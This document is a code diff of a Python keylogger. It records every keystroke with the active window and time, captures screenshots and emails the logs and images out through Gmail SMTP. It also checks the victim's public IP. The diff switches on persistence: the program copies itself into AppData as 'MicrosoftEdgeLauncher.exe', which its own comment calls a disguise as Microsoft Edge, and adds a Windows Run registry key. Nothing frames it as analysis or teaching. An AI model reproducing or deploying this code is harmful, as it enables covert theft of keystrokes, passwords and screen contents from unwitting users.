@@ -62,10 +62,6 @@ def key_callback(event : keyboard.KeyboardEvent):
         img_buffer.seek(0)
         screenshots.append(img_buffer)
 
-        # total_screenshots = len(os.listdir(screenshots_folder))
-        # image.save(rf"{screenshots_folder}\image_{total_screenshots}.png")
-        # screenshot_line = f" | Screenshot taken: image_{total_screenshots}.png"
-
     log_line += f"Key: {event.name} | "
     log_line += f"{curr_window} | "
 
@@ -73,8 +69,6 @@ def key_callback(event : keyboard.KeyboardEvent):
     log_line += f"{dt}"
     log_line += screenshot_line
 
-    # with open(log_file, "a", encoding="utf-8") as f:
-    #     f.write(log_line + "\n")
     memory_log.write(log_line + "\n")
 
     print(log_line)
@@ -111,8 +105,6 @@ def send_report():
                 file_name = f"image_{i}.png"
                 z.writestr(file_name, stream.getvalue())
 
-        # zip_path = shutil.make_archive(zip_file, "zip", screenshots_folder)
-
         memory_log.seek(0)
         log_file = MIMEApplication(memory_log.read(), Name="log.txt")
         log_file["Content-Disposition"] = 'attachment; filename="log.txt"'
@@ -121,22 +113,15 @@ def send_report():
         zip_file = MIMEApplication(zip_buffer.getvalue(), Name="screenshots.zip")
         zip_file["Content-Disposition"] = 'attachment; filename="screenshots.zip"'
         msg.attach(zip_file)
-        # attach_file(msg, zip_path)
-        # attach_file(msg, log_file)
         with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
             smtp_server.login(EMAIL, EMAIL_PASSWORD)
             smtp_server.sendmail(EMAIL, EMAIL, msg.as_string())
 
 
         # clear files
-        # with open(log_file, "w", encoding="utf-8") as f:
-        #     pass
         memory_log.seek(0)
         memory_log.truncate(0)
         screenshots = []
-        # if os.path.exists(screenshots_folder):
-        #     shutil.rmtree(screenshots_folder)
-        # os.makedirs(screenshots_folder)
 
     # except Exception as e:
     #     print("Failed to send report")
@@ -166,22 +151,15 @@ def check_flag():
 
 def setup():
     print("setting up")
-    # if not os.path.exists(working_folder):
-    #     print("making working folder")
-    #     os.mkdir(working_folder)
-
-    # if not os.path.exists(screenshots_folder):
-    #     print("making screenshots folder")
-    #     os.mkdir(screenshots_folder)
 
     # setup persistence 
 
-    # os_type = platform.system()
-    # if os_type == "Windows":
-    #     location = os.environ['appdata'] + "\\MicrosoftEdgeLauncher.exe" # Disguise the keylogger as Microsoft Edge
-    #     if not os.path.exists(location):
-    #         shutil.copyfile(executable, location)
-    #         subprocess.call(rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /t REG_SZ /d "{location}" ', shell=True)
+    os_type = platform.system()
+    if os_type == "Windows":
+        location = os.environ['appdata'] + "\\MicrosoftEdgeLauncher.exe" # Disguise the keylogger as Microsoft Edge
+        if not os.path.exists(location):
+            shutil.copyfile(executable, location)
+            subprocess.call(rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /t REG_SZ /d "{location}" ', shell=True)
 
     try: 
         data = str(urlopen('http://checkip.dyndns.com/').read())
@@ -210,9 +188,6 @@ def cleanup():
 
     keyboard.unhook_all()
     keyboard.unhook_all_hotkeys()
-
-    # if os.path.exists(working_folder):
-    #     shutil.rmtree(working_folder)
 
     os_type = platform.system()
     if os_type == "Windows":
